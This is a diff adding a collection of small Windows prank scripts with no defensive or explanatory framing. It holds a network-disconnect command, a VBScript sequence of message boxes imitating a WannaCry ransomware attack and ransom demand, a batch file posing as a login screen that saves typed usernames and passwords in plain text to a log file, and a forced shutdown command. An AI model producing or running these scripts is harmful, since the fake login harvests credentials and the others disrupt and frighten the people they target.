@@ -1,0 +1,34 @@
+1
+@Echo off
+Ipconfig /release
+2. ransomware
+X=MsgBox("Hi.. Welcome & How are you? Oh ! An Error, Do you want to Fix it?",4+64,"Welcome")
+X=MsgBox("Unable to Fix this Error. Do you want to scan this Computer",3+48,"Computer Error")
+X=MsgBox("Alert ! WannaCry Ransomware Detected. Delete Virus? ",3+16,"Alert!")
+X=MsgBox("Unable to delete this Ransomware!",1+64,"Critical Error")
+X=MsgBox("Decrypting Your Files",2+16,"Alert")
+X=MsgBox("Deleting System Files.....",2+16,"File Deletion")
+X=MsgBox("Copying Your Password.....",2+48,"Virus Alert")
+X=MsgBox("DATA Transferring ......(Please wait)!",4+64,"File Transfer")
+X=MsgBox("Deposite 1000$ in 3 Hours or You will loose Your files!",1+16,"WaNNaCrY DecroPtOr")
+X=MsgBox("Your Computer is Hacked",0+64,"Alert")
+X=MsgBox("Ha Ha ha... This was a Prank ! ",0+64,"I have Fooled You")
+X=MsgBox("Plaplapla ",0+64,"Subscribe")
+3
+@echo off
+color a
+title Login
+cls
+echo Please Enter Your Email Address And Password
+echo.
+echo.
+cd "C:Logs"
+set /p user=Username:
+set /p pass=Password:
+echo Username="%user%" Password="%pass%" >> Log.txt
+start >>Program Here<<
+exit
+
+4
+@echo off
+shutdown -c"Sleep Tight" -s
